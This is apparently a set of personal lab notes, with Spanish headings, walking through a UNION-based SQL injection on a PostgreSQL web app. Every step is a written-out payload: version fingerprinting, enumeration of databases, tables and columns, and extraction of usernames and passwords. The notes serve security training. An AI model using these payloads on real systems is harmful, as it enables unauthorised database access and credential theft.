```sql
'+UNION+SELECT+version(),version()+--+-
```

![[Pasted image 20241222232405.png]]

**Postgress found**

https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

**Extraer los nombres de las bases de datos**

```SQL
'+UNION+SELECT+datname,'a'+FROM+pg_database+--+- 
```

![[Pasted image 20241222233208.png]]

**Listar nombre de las tablas**

```SQL
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_type = 'BASE TABLE' AND table_schema NOT IN ('pg_catalog', 'information_schema');
```

![[Pasted image 20241222233949.png]]

**Listar nombre de las columnas**

``` SQL
SELECT column_name, data_type, is_nullable
FROM information_schema.columns
WHERE table_schema = 'public' AND table_name = 'nombre_tabla';
```

![[Pasted image 20241222234829.png]]

```SQL

'+UNION+SELECT+column_name,data_type+FROM+information_schema.columns+WHERE+table_schema+=+'public'+AND+table_name+=+'users_pssqck'+--+-
```


**Listar datos**

```SQL
'+UNION+SELECT+username_wbpptu,password_uvrxkv+FROM+users_pssqck+--+- 
```

![[Pasted image 20241222235101.png]]